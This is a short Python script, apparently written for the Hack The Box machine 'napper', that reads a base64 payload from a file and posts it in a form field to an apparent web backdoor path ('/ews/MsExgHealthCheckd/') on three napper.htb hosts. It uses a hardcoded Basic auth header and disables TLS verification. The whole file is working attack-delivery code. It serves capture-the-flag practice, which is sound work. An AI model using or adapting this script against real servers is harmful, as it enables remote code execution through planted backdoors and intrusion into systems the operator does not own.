import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


auth_header = 'Basic ZXhhbXBsZTpFeGFtcGxlUGFzc3dvcmQ='

headers = {
    'Authorization': auth_header
}

Hosts = ["napper.htb","app.napper.htb","internal.napper.htb"]

with open('b64', 'r') as file:
    Payload = file.read()

form_field = f"sdafwe3rwe23={requests.utils.quote(Payload)}"

for h in Hosts:
    url_ssl = f"https://{h}/ews/MsExgHealthCheckd/"

    try:
        r_ssl = requests.post(url_ssl, data=form_field, headers=headers, verify=False)
        print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print(e)
        pass




